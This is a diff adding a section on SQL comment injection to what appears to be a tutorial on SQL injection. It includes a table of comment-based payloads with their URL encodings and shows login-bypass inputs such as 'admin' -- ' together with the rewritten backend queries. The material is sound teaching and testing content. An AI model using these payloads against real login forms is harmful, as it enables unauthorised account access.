@@ -13,6 +13,8 @@ This document summarizes core techniques for discovery and exploitation of **SQL
     - [Filtering SQL Queries](#filtering-sql-queries)
     - [SQL Logical Operators](#sql-logical-operators)
     - [Introduction to SQL Injections](#introduction-to-sql-injections)
+    - [OR Injection](#or-injection)
+    - [Comment Injection](#comment-injection)
 
 ---
 
@@ -542,3 +544,65 @@ SELECT * FROM logins WHERE username = 'admin' OR ('1'='1' AND password ='') OR '
 ```
 
 - false OR (true AND false) OR true &rarr; false OR false OR true &rarr; false OR true &rarr; true
+
+---
+
+## Comment Injection
+
+SQL comments can be used to subvert query logic. There are two types of MySQL comments:
+
+- Double dash (`--`)
+- Hashtag (`#`)
+
+**Example:**
+
+```sql
+SELECT * FROM logins; -- This is a comment
+
+SELECT * FROM customers; # This is also a comment
+```
+
+**Common Comment-Based Payloads:**
+
+| Payload     | URL Encoded Payload    |
+| ----------- | ---------------------  |
+| `-- `       | `--+` or `--%20`       |
+| `#`         | `%23`                  |
+| `)-- `      | `%29--+` or `%29--%20` |
+| `)#`        | `%29%23`               |
+
+When using double dashes, a space or control character must follow `--` for the comment to be recognized. 
+
+The following example causes the SQL query to only check the username.
+
+**Example:**
+
+Inject any of the following payloads into the `Username` field, leave the `Password` field blank:
+
+```sql
+admin' -- 
+```
+
+```sql
+admin' # 
+```
+
+Backend SQL query after injection:
+
+```sql
+SELECT * FROM logins WHERE username = 'admin'--' AND password=''; 
+```
+
+```sql
+SELECT * FROM logins WHERE username = 'admin'#' AND password=''; 
+```
+
+The comment operator causes the remainder of the SQL query to be ignored by the database parser. The entire query will simply evaluate to:
+
+```sql
+SELECT * FROM logins WHERE username = 'admin'; 
+```
+
+---
+
+## Union Injection
